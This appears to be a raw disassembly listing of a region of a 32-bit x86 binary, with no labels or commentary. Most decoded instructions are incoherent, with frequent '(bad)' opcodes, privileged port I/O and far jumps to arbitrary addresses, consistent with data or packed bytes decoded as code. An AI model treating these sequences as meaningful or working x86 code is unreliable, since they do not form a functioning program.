  414f3c:	sub    BYTE PTR [ecx+ebp*1],al
  414f3f:	mov    DWORD PTR [edi-0x5967e4a5],esi
  414f45:	jo     0x414f03
  414f47:	sbb    bh,al
  414f49:	jo     0x414ecd
  414f4b:	pop    es
  414f4c:	imul   ebp,esi,0xd
  414f4f:	pop    esp
  414f50:	fiadd  WORD PTR [esi+0x70871219]
  414f56:	out    0xc8,al
  414f58:	jge    0x414fca
  414f5a:	lock test DWORD PTR [eax],eax
  414f5d:	jmp    0x6f39d6d0
  414f62:	dec    eax
  414f63:	jmp    0x414fae
  414f65:	test   al,0x3d
  414f67:	adc    dh,BYTE PTR [ebp+ebx*2+0x4e]
  414f6b:	xchg   DWORD PTR [eax],ecx
  414f6d:	inc    ecx
  414f6e:	adc    al,0x9d
  414f70:	std    
  414f71:	dec    esi
  414f72:	out    dx,al
  414f73:	mov    al,0xc7
  414f75:	sub    eax,DWORD PTR [ecx+0x5b]
  414f78:	push   ebx
  414f79:	jb     0x414f8c
  414f7b:	fcmovnb st,st(4)
  414f7d:	adc    eax,0x5cfe1126
  414f82:	js     0x414f9a
  414f84:	push   ecx
  414f85:	es nop
  414f87:	data16 std 
  414f89:	aam    0xb3
  414f8b:	call   0xe931:0x25e5e93f
  414f92:	cmp    eax,0xc0f6c066
  414f97:	sar    edi,0xe8
  414f9a:	cmp    eax,0xf1441a
	...
  414fc7:	add    BYTE PTR [ebx+ebx*2],bh
  414fca:	add    cl,ch
  414fcc:	not    BYTE PTR [esi+0x5b41e6f4]
  414fd2:	add    BYTE PTR [ebx+0x3a],dl
  414fd5:	test   DWORD PTR [eax],eax
  414fd7:	inc    ebx
  414fd8:	inc    edx
  414fd9:	test   DWORD PTR [eax],eax
  414fdb:	pop    esp
  414fdc:	ja     0x414fec
  414fde:	push   ecx
  414fdf:	je     0x414fa8
  414fe1:	or     eax,0xa2a1bef6
  414fe6:	std    
  414fe7:	cmp    al,0x9a
  414fe9:	adc    DWORD PTR [ebp+ebp*4-0x7e],esi
  414fed:	lock xor cl,ch
  414ff0:	cmp    eax,0x4715c066
  414ff5:	add    al,0x73
  414ff7:	call   0x67a9ab39
  414ffc:	ret    0x9a
  414fff:	add    al,al
  415001:	adc    ecx,DWORD PTR [edx]
  415003:	call   0x4069c8
  415008:	inc    edi
  415009:	xchg   esi,eax
  41500a:	int    0x8d
  41500c:	pop    edx
  41500d:	xchg   ebx,eax
  41500e:	idiv   bh
  415010:	pusha  
  415011:	daa    
  415012:	push   eax
  415013:	call   0x406a28
  415018:	pop    esi
  415019:	in     al,0xd9
  41501b:	div    DWORD PTR [eax-0x7e]
  41501e:	in     eax,0x35
  415020:	jmp    0x414fa2
  415022:	(bad)  
  415023:	push   0xffffffa7
  415025:	xor    eax,0x5dd668b9
  41502a:	std    
  41502b:	mov    ch,0x0
	...
  415055:	add    BYTE PTR [ebx],dh
  415057:	mov    bh,dh
  415059:	jmp    DWORD PTR [eax+0x54]
  41505c:	stos   BYTE PTR es:[edi],al
  41505d:	dec    eax
  41505e:	out    0x5d,al
  415060:	call   0xfec2289a
  415065:	mov    DWORD PTR [edx],ebx
  415067:	xchg   esi,esi
  415069:	inc    DWORD PTR [eax+0x35]
  41506c:	(bad)  
  41506d:	xor    DWORD PTR [bx],ebp
  415070:	inc    ecx
  415071:	add    BYTE PTR [eax-0x2e],dh
  415074:	fincstp 
  415076:	push   eax
  415077:	cmp    dh,0x35
  41507a:	lods   eax,DWORD PTR ds:[esi]
  41507b:	aad    0x40
  41507d:	add    BYTE PTR [edi+0x68],ch
  415080:	inc    ebp
  415081:	push   DWORD PTR [eax-0x72]
  415084:	test   ah,ch
  415086:	push   0x276afe80
  41508b:	xor    eax,0x576668c3
  415090:	std    
  415091:	mov    ch,0xd3
  415093:	mov    esi,edi
  415095:	call   eax
  415097:	push   ebx
  415098:	stos   BYTE PTR es:[edi],al
  415099:	dec    eax
  41509a:	push   di
  41509c:	call   0xfec1aa9a
  4150a1:	mov    DWORD PTR [esi],edi
  4150a3:	jg     0x4150fe
  4150a5:	test   BYTE PTR [ecx],0xe2
  4150a8:	xlat   BYTE PTR ds:[ebx]
  4150a9:	jmp    DWORD PTR [ecx-0x36]
  4150ac:	fld    DWORD PTR [eax+0x3e]
  4150af:	xchg   ecx,eax
  4150b0:	mov    eax,0x6e89f1db
  4150b5:	(bad)  
  4150b6:	sub    ebx,DWORD PTR [ecx+edi*4+0x40]
	...
  4150e1:	add    BYTE PTR [eax],al
  4150e3:	add    BYTE PTR [esi],bh
  4150e5:	stos   BYTE PTR es:[edi],al
  4150e6:	dec    edx
  4150e7:	inc    ebp
  4150e8:	shl    DWORD PTR [ecx-0x4e1d7b84],1
  4150ee:	outs   dx,BYTE PTR ds:[esi]
  4150ef:	(bad)  
  4150f0:	push   esp
  4150f1:	add    bl,dl
  4150f3:	int3   
  4150f4:	es ret 
  4150f6:	add    edi,edi
  4150f8:	jmp    0x415168
  4150fa:	jbe    0x4150fa
  4150fc:	test   eax,0xf6aa3849
  415101:	ret    0xe801
  415104:	fcmovnb st,st(0)
  415106:	outs   dx,BYTE PTR ds:[esi]
  415107:	inc    bh
  415109:	ja     0x41516c
  41510b:	test   BYTE PTR [ecx-0x6d437d97],0x69
  415112:	outs   dx,BYTE PTR ds:[esi]
  415113:	(bad)  
  415114:	ds mov ss,edx
  415117:	add    bl,BYTE PTR ds:[bx-0x43]
  41511c:	imul   ecx,DWORD PTR [edi-0x3ddb1807],0xef59fe6e
  415126:	je     0x41511e
  415128:	push   ecx
  415129:	xor    DWORD PTR [esp+esi*2+0x36],ebp
  41512d:	sbb    bh,BYTE PTR [edi+0x3f]
  415130:	inc    ecx
  415131:	and    DWORD PTR [esp+esi*4+0x2a],ebp
  415135:	shr    DWORD PTR [ebx-0x2],1
  415138:	xor    DWORD PTR [edi-0x4],eax
  41513b:	out    0xbe,eax
  41513d:	inc    ecx
  41513e:	imul   edi,esi,0x21
  415141:	xchg   DWORD PTR [esi+esi*8+0x19],ebx
  415145:	pop    ebx
  415146:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415147:	ins    DWORD PTR es:[edi],dx
	...
  415170:	add    BYTE PTR [eax],al
  415172:	mov    ah,BYTE PTR [ebx-0x71]
  415175:	repnz dec ecx
  415177:	adc    BYTE PTR [edi-0x69093593],dl
  41517d:	ins    DWORD PTR es:[edi],dx
  41517e:	clc    
  41517f:	paddw  mm7,mm3
  415182:	fnstenv [esi+0x27]
  415185:	ins    DWORD PTR es:[edi],dx
  415186:	call   0xe8a58e9a
  41518b:	movq   mm5,QWORD PTR [ebp+0x52]
  41518f:	arpl   WORD PTR [edi-0x2a],cx
  415192:	adc    DWORD PTR [eax],edx
  415194:	pop    edi
  415195:	ins    DWORD PTR es:[edi],dx
  415196:	xchg   edx,eax
  415197:	cs pop edi
  415199:	ins    DWORD PTR es:[edi],dx
  41519a:	ror    BYTE PTR [edi],0xd5
  41519d:	sti    
  41519e:	mov    eax,ds:0xb06d45da
  4151a3:	pcmpeqw mm2,QWORD PTR [eax-0x50]
  4151a7:	getsec 
  4151a9:	pop    esp
  4151aa:	push   edi
  4151ab:	pushf  
  4151ac:	cs ins DWORD PTR es:[edi],dx
  4151ae:	cwde   
  4151af:	lds    edx,FWORD PTR [edi]
  4151b1:	jne    0x415143
  4151b3:	movups xmm1,XMMWORD PTR ds:0x6d170ffd
  4151ba:	retf   0x16fe
  4151bd:	ins    DWORD PTR es:[edi],dx
  4151be:	js     0x4151c2
  4151c0:	fadd   st(0),st
  4151c2:	jo     0x4151d3
  4151c4:	push   DWORD PTR [esi+0x6cf70761]
  4151ca:	pop    ecx
  4151cb:	popa   
  4151cc:	stos   BYTE PTR es:[edi],al
  4151cd:	ins    BYTE PTR es:[edi],dx
  4151ce:	pop    eax
  4151cf:	setge  BYTE PTR [edi+0x48]
  4151d3:	pandn  mm3,QWORD PTR [ebx+0x0]
	...
  4151ff:	add    BYTE PTR [ebx-0x64],cl
  415202:	(bad)  
  415203:	ins    BYTE PTR es:[edi],dx
  415204:	inc    eax
  415205:	(bad)
  415208:	cmp    BYTE PTR [edi],cl
  41520a:	shl    BYTE PTR [eax+0x7f],1
  41520d:	push   cs
  41520e:	mov    edi,0x113826c
  415213:	rcr    BYTE PTR ds:0xaaaefe11,0x87
  41521a:	cld    
  41521b:	xchg   ecx,eax
  41521c:	adc    bh,BYTE PTR [esi]
  41521e:	add    cl,ch
  415220:	inc    esp
  415221:	sbb    al,0x9
  415223:	jmp    0x6b2e3410
  415228:	adc    DWORD PTR [edx],0xa417e96b
  41522e:	std    
  41522f:	hlt    
  415230:	in     eax,0xf6
  415232:	add    ebp,DWORD PTR [ecx]
  415234:	push   ebx
  415235:	or     eax,0x764e2488
  41523a:	call   0xc5d4:0xff0efcd1
  415241:	test   BYTE PTR [eax],0x57
  415244:	push   edx
  415245:	or     eax,0xd29d4fe
  41524a:	je     0x41523d
  41524c:	adc    eax,0x1a3e403e
  415251:	and    eax,ebx
  415253:	in     eax,dx
  415254:	cmp    eax,0xbe3d89a8
  415259:	sbb    dh,ch
  41525b:	mov    BYTE PTR es:[edx-0x18],ah
  41525f:	xchg   edi,eax
  415260:	sub    BYTE PTR [ebx+0x0],bl
  415263:	loop   0x415265
	...
  41528d:	add    ch,bh
  41528f:	xchg   BYTE PTR [eax+eiz*1],al
  415292:	jmp    DWORD PTR [ecx+0x0]
  415295:	push   es
  415296:	push   0x4887e85e
  41529b:	pop    ebx
  41529c:	add    dl,ah
  41529e:	std    
  41529f:	xchg   BYTE PTR [eax+eiz*1],al
  4152a2:	jmp    DWORD PTR [ecx+0x0]
  4152a5:	jo     0x415326
  4152a7:	push   es
  4152a8:	(bad)  
  4152a9:	push   esp
  4152aa:	(bad)  
  4152ac:	xchg   esp,eax
  4152ad:	sub    edx,ebp
  4152af:	or     al,0x88
  4152b1:	and    al,0xa6
  4152b3:	or     eax,0x81fb0074
  4152b8:	je     0x4152b2
  4152ba:	call   0xbc2960ca
  4152bf:	sar    dh,1
  4152c1:	call   FWORD PTR [edx+ebx*4]
  4152c4:	jno    0x415301
  4152c6:	mov    ds,WORD PTR [edx+esi*8]
  4152c9:	push   0x17
  4152cb:	xchg   ebx,eax
  4152cc:	inc    esp
  4152cd:	hlt    
  4152ce:	inc    edi
  4152cf:	xor    BYTE PTR [esp+edi*8-0x41],0xaa
  4152d4:	push   0xffffffff
  4152d6:	mov    eax,0x174be0d
  4152db:	xor    bh,dh
  4152dd:	(bad)  
  4152df:	sar    dh,0x75
  4152e2:	fbstp  TBYTE PTR [ecx-0x7da7c10a]
  4152e8:	(bad)  
  4152e9:	jne    0x4152c6
  4152eb:	xor    BYTE PTR [eax+ecx*1+0x7f],0xd1
  4152f0:	inc    DWORD PTR ds:[eax]
	...
  41531b:	add    BYTE PTR [eax],cl
  41531d:	xor    BYTE PTR [esp+esi*8-0x8],0xb
  415322:	cli    
  415323:	push   edx
  415325:	adc    esi,esp
  415327:	adc    al,0xa8
  415329:	cmp    dh,0xff
  41532c:	shl    BYTE PTR [ebp-0x1b],cl
  41532f:	and    eax,0xc9fe80e5
  415334:	push   ebp
  415335:	adc    edi,esi
  415337:	push   esp
  415338:	sbb    al,0xb3
  41533a:	add    ah,0x33
  41533d:	sub    edi,edi
  41533f:	jne    0x4153ac
  415341:	mov    cl,0xee
  415343:	inc    esi
  415344:	push   0xe2c00a80
  415349:	pop    edx
  41534a:	pop    esi
  41534b:	leave  
  41534c:	and    eax,0x228cfe13
  415351:	xchg   DWORD PTR [ebp-0x1],ecx
  415354:	repnz adc ah,dh
  415357:	mov    eax,ds:0xfe693d3e
  41535c:	inc    ebp
  41535d:	ret    0x83fa
  415360:	push   ds
  415361:	add    eax,DWORD PTR [edx]
  415363:	add    BYTE PTR [ecx],ch
  415365:	dec    eax
  415366:	push   0x69403ae7
  41536b:	inc    bh
  41536d:	aaa    
  41536e:	pop    eax
  41536f:	dec    BYTE PTR [ebx+0x1a746ab6]
  415375:	out    dx,al
  415376:	lock not DWORD PTR [esi]
  415379:	sbb    esp,eax
  41537b:	(bad)  
  41537c:	stc    
  41537d:	jns    0x41536f
  41537f:	jmp    0x415381
	...
  4153a9:	add    bh,ah
  4153ab:	mov    eax,ds:0x6a3e0001
  4153b0:	outs   dx,DWORD PTR ds:[esi]
  4153b1:	addr16 jg 0x4153b6
  4153b4:	shl    bh,1
  4153b6:	mov    esp,ecx
  4153b8:	add    DWORD PTR [eax],eax
  4153ba:	inc    ebp
  4153bb:	inc    edx
  4153bc:	lock add al,0xd7
  4153bf:	fiadd  DWORD PTR [ecx]
  4153c1:	add    BYTE PTR [esi],bh
  4153c3:	jns    0x415436
  4153c5:	addr16 mov bl,0x1a
  4153c8:	(bad)  
  4153cb:	mov    BYTE PTR ds:0x72013e00,dl
  4153d1:	mov    BYTE PTR [ebx],ch
  4153d3:	call   0x5601:0xc32704d9
  4153da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4153db:	sub    BYTE PTR [eax],bl
  4153dd:	add    BYTE PTR [esi],bh
  4153df:	or     DWORD PTR [edx+0x74],eax
  4153e2:	cmp    al,0x59
  4153e4:	out    dx,eax
  4153e5:	mov    DWORD PTR [esi+0x7a],ecx
  4153e8:	shl    dl,1
  4153ea:	(bad)  
  4153eb:	mov    edi,0xeb41675d
  4153f0:	(bad)  
  4153f1:	dec    DWORD PTR [ebx]
  4153f3:	pop    edx
  4153f4:	adc    al,0x2e
  4153f6:	ds add bh,bh
  4153f9:	mov    edi,0x5ce95acb
  4153fe:	jmp    0x2882:0x38dcd7df
  415405:	add    al,0x26
  415407:	pushf  
  415408:	sti    
  415409:	add    edi,DWORD PTR [esi]
  41540b:	pop    eax
  41540c:	mov    bh,0x7b
	...
  415436:	add    BYTE PTR [eax],al
  415438:	mov    dl,0x2f
  41543a:	push   eax
  41543b:	call   DWORD PTR [esi+0x21d1e79a]
  415441:	cld    
  415442:	cld    
  415443:	add    edi,DWORD PTR [esi]
  415445:	pusha  
  415446:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415447:	out    dx,eax
  415448:	aas    
  415449:	add    bl,ah
  41544b:	jge    0x41547e
  41544d:	jecxz  0x41548b
  41544f:	push   ecx
  415450:	(bad)  
  415451:	xchg   ebp,eax
  415452:	scas   eax,DWORD PTR es:[edi]
  415453:	jge    0x4154cf
  415455:	imul   DWORD PTR [ebp+0x24e03e04]
  41545b:	dec    esp
  41545c:	sti    
  41545d:	pop    edx
  41545e:	out    0x68,eax
  415460:	push   edx
  415461:	das    
  415462:	outs   dx,DWORD PTR ds:[esi]
  415463:	out    dx,eax
  415464:	(bad)  [ebx]
  415466:	(bad)  
  415468:	loope  0x415451
  41546a:	pop    ebp
  41546b:	imul   eax,eax,0xc464bce0
  415471:	xchg   ebp,eax
  415472:	inc    ebx
  415473:	jl     0x4154b6
  415475:	loope  0x415413
  415477:	push   eax
  415478:	mov    ah,0x95
  41547a:	pop    ds
  41547b:	jl     0x4154ae
  41547d:	fcomi  st,st(5)
  41547f:	add    ecx,DWORD PTR [ecx-0x2a]
  415482:	xchg   ebx,eax
  415483:	push   0xef270b90
  415488:	xchg   ebp,eax
  415489:	add    cl,al
  41548b:	ret    0xb80
  41548e:	gs mov edi,0xb8ffaa69
  415494:	clc    
  415495:	or     eax,DWORD PTR [edi]
  415497:	pop    ebp
  415498:	imul   ebp,DWORD PTR [ebp+0x4630],0x0
	...
  4154c6:	xor    eax,0xda9c005b
  4154cb:	(bad)  
  4154cc:	std    
  4154cd:	je     0x415518
  4154cf:	repz pop ebx
  4154d1:	sub    al,0xd7
  4154d3:	or     al,0xa
  4154d5:	test   eax,0xb1684251
  4154da:	adc    eax,0x9239009c
  4154df:	repz inc esp
  4154e1:	(bad)  
  4154e2:	xchg   esi,eax
  4154e3:	call   0x4100:0x4a8c3e68
  4154ea:	inc    edx
  4154eb:	pop    ebx
  4154ec:	in     eax,dx
  4154ed:	outs   dx,DWORD PTR ds:[esi]
  4154ee:	cmc    
  4154ef:	repz push 0xfdab4228
  4154f5:	adc    al,0x2
  4154f7:	add    esp,DWORD PTR ds:0xe9096701
  4154fd:	mov    cl,0xfd
  4154ff:	or     esi,edi
  415501:	mov    al,0x83
  415503:	bound  eax,QWORD PTR [eax]
  415505:	adc    al,0x63
  415507:	test   BYTE PTR [ecx+0x7461ad],0x3
  41550e:	nop
  41550f:	or     DWORD PTR [ecx+esi*8+0x65],esi
  415513:	add    al,0x3c
  415515:	pop    esi
  415516:	push   esi
  415517:	rol    DWORD PTR [ebx+0x55],cl
  41551a:	fwait
  41551b:	fs std 
  41551d:	aam    0xb5
  41551f:	add    ah,BYTE PTR [esi+eax*2+0xa6b0916]
  415526:	pop    ss
  415527:	(bad)
	...
  415553:	add    dl,cl
  415555:	or     esi,edi
  415557:	cs jae 0x4155c0
  41555a:	std    
  41555b:	pushf  
  41555c:	test   DWORD PTR [edx],eax
  41555e:	nop
  41555f:	push   ds
  415560:	push   ss
  415561:	or     DWORD PTR [ecx-0x17],ebp
  415564:	cmp    eax,0xda81befa
  415569:	cmp    DWORD PTR [edi],0xd6265700
  41556f:	push   0x75fd5e96
  415574:	pop    edi
  415575:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415576:	(bad)  
  415577:	imul   esp,DWORD PTR [eax-0x7e],0x826375fe
  41557e:	je     0x415588
  415580:	outs   dx,DWORD PTR ds:[esi]
  415581:	je     0x4155bf
  415583:	call   DWORD PTR [eax]
  415585:	dec    eax
  415586:	mov    edi,0x8b2b2704
  41558b:	in     al,dx
  41558c:	xchg   esi,eax
  41558d:	fwait
  41558e:	aad    0xf7
  415590:	loopne 0x415513
  415592:	mov    WORD PTR [ebp-0x2d],es
  415595:	push   DWORD PTR cs:[ebp-0xd]
  415599:	xor    BYTE PTR [eax+ecx*1-0x51],0xeb
  41559e:	sub    DWORD PTR [eax],eax
  4155a0:	pop    ss
  4155a1:	add    eax,0x9f6a0fbe
  4155a6:	add    BYTE PTR [eax],al
  4155a8:	out    0x48,eax
  4155aa:	inc    esp
  4155ab:	clc    
  4155ac:	xlat   BYTE PTR ds:[ebx]
  4155ad:	pop    ebp
  4155ae:	add    BYTE PTR [eax],al
  4155b0:	cwde   
  4155b1:	sbb    esi,edx
  4155b3:	(bad)  
  4155b4:	call   0xab5616
	...
  4155e1:	add    bh,ah
  4155e3:	and    edi,esi
  4155e5:	imul   edx,edi,0x9a8cfe23
  4155eb:	jns    0x41563a
  4155ed:	lea    ebp,[edx]
  4155ef:	mov    esi,esi
  4155f1:	inc    DWORD PTR [eax]
  4155f3:	das    
  4155f4:	push   DWORD PTR [ebp-0x1]
  4155f7:	xor    DWORD PTR [esp+edi*8+0xf],0xa7002a2a
  4155ff:	add    al,0xbe
  415601:	je     0x41559d
  415603:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415604:	add    BYTE PTR [ecx],0x97
  415607:	pop    ebp
  415608:	push   0xfe1ecf86
  41560d:	(bad)  
  41560e:	ds out 0xf5,eax
  415611:	out    0xb6,eax
  415613:	mov    ah,0x66
  415615:	dec    BYTE PTR [esi]
  415617:	lea    edx,[esp+ecx*4-0x45]
  41561b:	movq   mm7,mm6
  41561e:	pop    ecx
  41561f:	jecxz  0x4155f0
  415621:	out    0xa6,eax
  415623:	mov    ah,0x66
  415625:	(bad)  
  415626:	mov    bh,0x76
  415628:	dec    ecx
  415629:	test   BYTE PTR [ecx+0x28],0x5a
  41562d:	std    
  41562e:	jns    0x415661
  415630:	imul   edi,DWORD PTR ds:0x319a,0x66f27f69
  415639:	mov    ah,0x6
  41563b:	shl    BYTE PTR [esi-0x2],cl
  41563e:	sbb    DWORD PTR [eax-0x4],ecx
  415641:	out    0x3f,eax
  415643:	xor    eax,0xfe65
	...
  415670:	mov    bh,0x77
  415672:	jno    0x41566a
  415674:	add    edx,ebp
  415676:	xlat   BYTE PTR ds:[ebx]
  415677:	jmp    DWORD PTR [ecx+0x2e]
  41567a:	fld    QWORD PTR [eax+0x3e]
  41567d:	fnstenv [eax+0x66e1f1d7]
  415683:	(bad)  
  415684:	imul   ecx,DWORD PTR [edx],0x5a
  415687:	in     eax,0x7c
  415689:	xchg   ecx,eax
  41568a:	data16 mov BYTE PTR [ebx-0x3601917a],bh
  415691:	sub    al,0x2
  415693:	push   0xffc52b7b
  415698:	mov    eax,0xb1f649e7
  41569d:	cdq    
  41569e:	data16 je 0x4156d7
  4156a1:	stos   BYTE PTR es:[edi],al
  4156a2:	cmp    al,BYTE PTR [ecx-0x5f]
  4156a5:	dec    ecx
  4156a6:	jl     0x41562c
  4156a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4156a9:	dec    ecx
  4156aa:	data16 inc bl
  4156ad:	jg     0x4156f4
  4156af:	test   BYTE PTR [ecx+0x19d3265b],0x99
  4156b6:	nop
  4156b7:	les    edi,FWORD PTR [ecx+0x9]
  4156ba:	pop    ebp
  4156bb:	dec    ebx
  4156bc:	push   0xf2660f08
  4156c1:	push   edx
  4156c2:	setp   bh
  4156c5:	pop    es
  4156c6:	(bad)  
  4156c7:	jnp    0x41568b
  4156c9:	(bad)  
  4156ca:	(bad)  
  4156cb:	gs push eax
  4156cd:	jne    0x4156b6
  4156cf:	(bad)  
  4156d1:	jno    0x4156fb
  4156d3:	add    al,0x0
	...
  4156fd:	add    BYTE PTR [ecx-0x32],al
  415700:	mov    edi,0xd708386d
  415705:	out    dx,eax
  415706:	cmp    ebx,esi
  415708:	ja     0x4156cc
  41570a:	sub    BYTE PTR [eax],cl
  41570c:	jno    0x41578d
  41570e:	add    DWORD PTR [eax],edx
  415710:	mov    edi,0xb7c5bc65
  415715:	ins    DWORD PTR es:[edi],dx
  415716:	adc    BYTE PTR [eax],cl
  415718:	call   0x651dec0c
  41571d:	pop    eax
  41571e:	or     BYTE PTR [eax],cl
  415720:	lahf   
  415721:	add    al,0x72
  415723:	jge    0x41578f
  415725:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415726:	(bad)  [edi]
  415728:	(bad)  
  415729:	gs jmp 0xe21d77ba
  41572f:	pop    es
  415730:	(bad)  
  415731:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415732:	fmul   DWORD PTR [ebp+0x43d45bd7]
  415738:	outs   dx,BYTE PTR ds:[esi]
  415739:	gs enter 0x57cd,0x6d
  41573e:	rol    BYTE PTR [edi],0x5f
  415741:	out    dx,eax
  415742:	dec    ecx
  415743:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415745:	daa    
  415746:	mov    cl,0x7
  415748:	dec    edi
  415749:	scas   eax,DWORD PTR es:[edi]
  41574a:	xchg   ebp,eax
  41574b:	cmova  esp,DWORD PTR [ebp-0x60]
  41574f:	(bad)  
  415750:	xlat   BYTE PTR ds:[ebx]
  415751:	pop    ebx
  415752:	inc    BYTE PTR [esi+0x0]
  415755:	sbb    ecx,DWORD PTR ss:[ecx]
  415758:	mov    ah,0x41
  41575a:	sbb    ecx,DWORD PTR [ecx]
  41575c:	(bad)  
  41575d:	es xchg ecx,eax
  41575f:	push   edi
  415760:	call   0x41583f
	...
  415789:	add    BYTE PTR [eax],al
  41578b:	add    BYTE PTR [ecx],ah
  41578d:	or     dh,bh
  41578f:	push   ss
  415790:	mov    eax,ds:0xe30ef623
  415795:	or     BYTE PTR [ebp+ecx*1-0x101f72d],dh
  41579c:	push   0x26fae857
  4157a1:	or     dh,bh
  4157a3:	out    dx,al
  4157a4:	cwde   
  4157a5:	daa    
  4157a6:	mul    dh
  4157a8:	fimul  DWORD PTR [eax]
  4157aa:	je     0x4157a5
  4157ac:	xchg   ebp,eax
  4157ad:	imul   edi,DWORD PTR [esi+edx*8],0xffffff9a
  4157b1:	add    eax,0xcfa2f974
  4157b6:	fdivr  DWORD PTR [esi+0x34fe059a]
  4157bc:	sbb    bh,bh
  4157be:	jb     0x415777
  4157c0:	call   0xfe0d:0x7574fe05
  4157c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4157c8:	gs cld 
  4157ca:	ds sahf 
  4157cc:	bound  eax,QWORD PTR ds:0x56299b4
  4157d2:	inc    BYTE PTR [ecx-0x7902b786]
  4157d8:	pop    edx
  4157d9:	iret   
  4157da:	in     al,dx
  4157db:	jbe    0x41583f
  4157dd:	add    eax,0x61ba5e9
  4157e2:	(bad)  
  4157e3:	outs   dx,BYTE PTR ds:[esi]
  4157e4:	cwde   
  4157e5:	(bad)  
  4157e6:	cmc    
  4157e7:	pop    dx
  4157e9:	(bad)  
  4157ea:	mov    edi,0xfe05231f
  4157ef:	pushf  
	...
  415818:	add    BYTE PTR [eax],al
  41581a:	adc    DWORD PTR ds:0xd0054efe,ecx
  415820:	ds add al,bh
  415823:	jle    0x415823
  415825:	mov    ch,0x7
  415827:	ja     0x415827
  415829:	(bad)  
  41582a:	jmp    edx
  41582c:	cmp    edi,edi
  41582e:	pop    eax
  41582f:	jg     0x415875
  415831:	clc    
  415832:	cs iret 
  415834:	sti    
  415835:	call   FWORD PTR [eax+0x7f]
  415838:	je     0x415836
  41583a:	aas    
  41583b:	inc    edi
  41583c:	daa    
  41583d:	add    BYTE PTR [edi+0x41],dl
  415840:	mov    edi,0x8b15570c
  415845:	in     al,dx
  415846:	in     al,0x45
  415848:	stc    
  415849:	push   0x67
  41584b:	and    al,0x4b
  41584d:	call   edx
  41584f:	add    esi,esp
  415851:	mov    ebp,0x89fe7a1c
  415856:	bound  edi,QWORD PTR [ebx-0x2]
  415859:	jne    0x41587a
  41585b:	repnz push cs
  41585d:	imul   edx,DWORD PTR [esi+0x5f],0x16cd35fd
  415864:	inc    ecx
  415865:	add    bh,ch
  415867:	mov    ds:0x79c8fffc,al
  41586c:	je     0x415876
  41586e:	jg     0x4158da
  415870:	addr16 inc ecx
  415872:	pop    ss
  415873:	repnz (bad) 
  415875:	jmp    edi
  415877:	fxam   
  415879:	loop   0x415845
  41587b:	jns    0x41587b
  41587d:	inc    DWORD PTR [eax]
	...
  4158a7:	add    BYTE PTR [edx+0x7b],dl
  4158aa:	(bad)  
  4158ab:	jne    0x41589c
  4158ad:	jno    0x41587c
  4158af:	cmp    ebx,DWORD PTR [eax+0x7a]
  4158b2:	enter  0xe3c2,0x59
  4158b6:	push   ebx
  4158b7:	mov    ecx,DWORD PTR [ebx-0x22]
  4158ba:	sar    esp,0xed
  4158bd:	pop    ecx
  4158be:	push   0x4c
  4158c0:	sbb    BYTE PTR [esi+eax*1],ah
  4158c3:	call   0xff608106
  4158c8:	test   eax,0x16fbc77a
  4158cd:	hlt    
  4158ce:	add    edi,ebp
  4158d0:	fsubr  DWORD PTR [ebx]
  4158d2:	call   0xea35583f
  4158d7:	jo     0x4158f0
  4158d9:	mov    bl,0x1
  4158db:	dec    DWORD PTR [ebx]
  4158dd:	or     al,0x6a
  4158df:	pop    esi
  4158e0:	loope  0x415946
  4158e2:	popa   
  4158e3:	(bad)  
  4158e4:	jmp    0x415955
  4158e6:	popa   
  4158e7:	je     0x41591f
  4158e9:	pop    esp
  4158ea:	ja     0x415926
  4158ec:	popa   
  4158ed:	pop    esp
  4158ee:	dec    ebx
  4158ef:	rol    DWORD PTR [edx-0xc],0xb8
  4158f3:	mov    ah,BYTE PTR [edx+0x72]
  4158f6:	dec    eax
  4158f7:	iret   
  4158f8:	push   ecx
  4158f9:	hlt    
  4158fa:	bound  ecx,QWORD PTR [ebx+edi*8-0x4c014e01]
  415901:	mul    BYTE PTR [edx+0x74]
  415904:	inc    esi
  415905:	sbb    dh,BYTE PTR [ecx]
  415907:	sub    bh,BYTE PTR [esi]
  415909:	repnz push cs
  41590b:	rol    BYTE PTR [eax],0x0
	...
  415936:	xor    DWORD PTR [edi-0x8],esi
  415939:	add    DWORD PTR [esi],edi
  41593b:	repnz dec edx
  41593d:	inc    esp
  41593e:	push   ss
  41593f:	repz add DWORD PTR [eax],eax
  415942:	ds mov ebp,0xf601f3c8
  415948:	add    DWORD PTR [eax],eax
  41594a:	fs bnd jmp 0x41594d
  41594e:	addr16 bnd jmp 0x415951
  415952:	mov    edx,0xb34f583f
  415957:	ja     0x4159ae
  415959:	neg    cl
  41595b:	test   DWORD PTR [ecx+0x628a4bfe],esi
  415961:	je     0x41592d
  415963:	fisub  DWORD PTR [edx+0x28]
  415966:	ds pop ebx
  415968:	out    0xe,eax
  41596a:	jle    0x4158fb
  41596c:	in     al,0x6c
  41596e:	mov    DWORD PTR [edx-0x19],ebx
  415971:	add    edx,DWORD PTR [esi]
  415973:	fstp   QWORD PTR [edi-0x42fa5e3c]
  415979:	(bad)  
  41597b:	stos   DWORD PTR es:[edi],eax
  41597c:	test   al,0x62
  41597e:	nop
  41597f:	stos   DWORD PTR es:[edi],eax
  415980:	bound  esi,QWORD PTR [ebx]
  415982:	mov    edx,0x805a33de
  415987:	add    al,0xb8
  415989:	mov    ch,0x61
  41598b:	fwait
  41598c:	test   al,0x62
  41598e:	jo     0x415962
  415990:	ins    BYTE PTR es:[edi],dx
  415991:	cmp    esi,DWORD PTR [eax+0x4]
  415994:	packssdw mm1,mm3
  415997:	inc    esi
  415998:	push   es
  415999:	bound  eax,QWORD PTR [eax]
	...
  4159c3:	add    bh,ah
  4159c5:	pop    edx
  4159c6:	(bad)  
  4159c7:	jnp    0x4159af
  4159c9:	cdq    
  4159ca:	out    0x62,eax
  4159cc:	xchg   edx,eax
  4159cd:	and    esi,edi
  4159cf:	popa   
  4159d0:	inc    eax
  4159d1:	add    al,0x5d
  4159d3:	or     al,0x26
  4159d5:	loop   0x4159fe
  4159d7:	popa   
  4159d8:	xor    dl,dl
  4159da:	ins    BYTE PTR es:[edi],dx
